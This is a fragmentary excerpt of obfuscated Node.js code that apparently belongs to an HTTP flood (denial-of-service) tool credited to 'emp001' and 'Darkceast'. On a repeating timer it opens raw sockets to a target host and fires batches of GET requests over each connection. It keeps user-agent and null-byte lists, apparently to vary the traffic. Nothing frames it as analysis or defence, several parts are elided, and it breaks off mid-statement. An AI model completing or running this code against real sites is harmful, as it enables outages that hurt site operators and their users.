...
process.argv.length <= 2 &&
  ...
  console.log('by emp001 Touched by Darkceast'),
  process.exit(-1))
...
const userAgents = [
  ...
  nullHexs = ['\0', 'Ã¿', 'Ã‚', '\xA0']
var int = setInterval(() => {
  var _0x159498 = require('net').Socket()
  _0x159498.connect(80, host)
  _0x159498.setTimeout(10000)
  for (var _0x168c01 = 0; _0x168c01 < req_per_ip; _0x168c01++) {
    _0x159498.write(
      'GET ' +
        target +
        ' HTTP/1.1\r\nHost: ' +
  ...
  _0x159498.on('data', function () {
    setTimeout(function () {
      return _0x159498.destroy(), delete _0x159498
    }, 5000)
  })
})
setInterval(() => {
